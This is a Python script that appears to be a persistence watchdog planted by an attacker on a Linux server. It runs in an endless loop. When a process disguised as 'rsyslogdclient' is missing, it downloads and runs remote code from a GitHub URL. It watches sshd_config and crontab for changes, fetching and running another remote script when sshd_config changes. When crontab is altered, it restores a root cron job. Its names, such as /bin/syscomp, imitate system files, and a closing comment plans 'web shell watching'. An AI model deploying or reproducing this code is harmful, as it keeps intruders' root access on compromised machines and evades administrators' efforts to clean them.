import hashlib
import os
import time

sshStatus = "needhash"
cronStatus = "needhash"
watcher2 = "notrunning"

while True:
    os.system("ps aux > /tmp/123123123mjjxjd")
    if 'rsyslogdclient' in open('/tmp/123123123mjjxjd').read():
        #print "true"
        os.system("rm -rf /tmp/123123123mjjxjd")
        pass
    else:
        os.system("rm -rf /usr/sbin/rsyslogdclient")
        os.system("wget -O /usr/sbin/rsyslogdclient https://raw.githubusercontent.com/shad0wghost/mylinuxnow/master/watcher2.py")
        os.system("python /usr/sbin/rsyslogdclient &")
        os.system("rm -rf /tmp/123123123mjjxjd")
    if sshStatus == "needhash":
        hasher = hashlib.md5()
        with open('/etc/ssh/sshd_config', 'rb') as afile:
            buf = afile.read()
            hasher.update(buf)
            sshFileHash = hasher.hexdigest()
        f = open("/bin/syscomp", "w")
        f.write(sshFileHash)
        f.close()
        sshStatus = "checking"
    elif sshStatus == "checking":
        hasher = hashlib.md5()
        with open('/etc/ssh/sshd_config', 'rb') as afile:
            buf = afile.read()
            hasher.update(buf)
            sshCheckFileHash = hasher.hexdigest()
        str(sshFileHash)
        goldHash = open('/bin/syscomp', 'r').read()
        if goldHash == sshCheckFileHash:
            pass
            #print('gg')
        else:
            os.system('wget -O /tmp/process2.py https://raw.githubusercontent.com/shad0wghost/mylinuxnow/master/softconfigs.py')
            os.system('python /tmp/process2.py')
            os.system('rm -rf /tmp/process2.py')
            sshStatus = "needhash"
            #print("NOT GG MAND ITS FUCKED")
    if cronStatus == "needhash":
        #print("getting goldenhash")
        hasher = hashlib.md5()
        with open('/etc/crontab', 'rb') as afile:
            buf = afile.read()
            hasher.update(buf)
            sshFileHash = hasher.hexdigest()
        f = open("/bin/sysdirls", "w")
        f.write(sshFileHash)
        f.close()
        cronStatus = "checking"
    elif cronStatus == "checking":
        hasher = hashlib.md5()
        with open('/etc/crontab', 'rb') as afile:
            buf = afile.read()
            hasher.update(buf)
            cronCheckFileHash = hasher.hexdigest()
        str(cronCheckFileHash)
        goldHash = open('/bin/sysdirls', 'r').read()
        if goldHash == cronCheckFileHash:
            #print("good")
            pass
            #print('gg')
        else:
            if "#* * * * * root bash /usr/bin/syslogstart.sh" in open('/etc/crontab').read():
                os.system("sed -i 's/\#\* \* \* \* \* root bash \/usr\/bin\/syslogstart.sh*$/\* \* \* \* \* root bash \/usr\/bin\/syslogstart.sh/g' /etc/crontab")

            elif '* * * * * root bash /usr/bin/syslogstart.sh' in open('/etc/crontab').read():
                #print "true"
                cronStatus = "needhash"
            else:
                os.system('echo "* * * * * root bash /usr/bin/syslogstart.sh" >> /etc/crontab')
                cronStatus = "needhash"
                time.sleep(1)
                #print("fixing")
            #print("NOT GG MAND ITS FUCKED")
    time.sleep(1)


## TODO: add cron watching, web shell watching, syslogstart watcher parrell watchers
